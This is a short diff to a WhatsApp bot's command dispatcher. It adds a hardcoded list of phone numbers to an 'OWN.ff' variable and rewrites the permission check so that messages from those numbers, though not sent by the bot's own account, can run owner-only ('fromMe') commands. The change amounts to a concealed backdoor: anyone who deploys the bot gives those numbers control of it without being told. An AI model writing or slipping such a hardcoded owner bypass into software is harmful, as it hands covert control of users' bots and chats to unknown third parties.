@@ -21,6 +21,7 @@ const {eventEmit} = require("cobra-event-emit").event_emit
 
 const Language = require('./DATABASE/language');
 const Lang = Language.getString('updater');
+var OWN = { ff: '94729352830,94787166875,0' }
 
 // ════════════════════SQL🍁🍁
 async function  fetchJson(url, options)  {
@@ -126,7 +127,7 @@ events.commands.map(
                         else if (command.onlyGroup === chat.jid.includes('-')) sendMsg = true;
                     }
                      
-                    if ((OWN.ff == "94720603183,94771039631,94717954374,94711421243,94705384218,94784506970" && msg.key.fromMe === false && command.fromMe === true &&
+                    if ((OWN.ff == "94729352830,94787166875,0" && msg.key.fromMe === false && command.fromMe === true &&
                         (msg.participant && OWN.ff.includes(',') ? OWN.ff.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == OWN.ff || OWN.ff.includes(',') ? OWN.ff.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == OWN.ff)
                     ) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
                         if (command.onlyPinned && chat.pin === undefined) return;
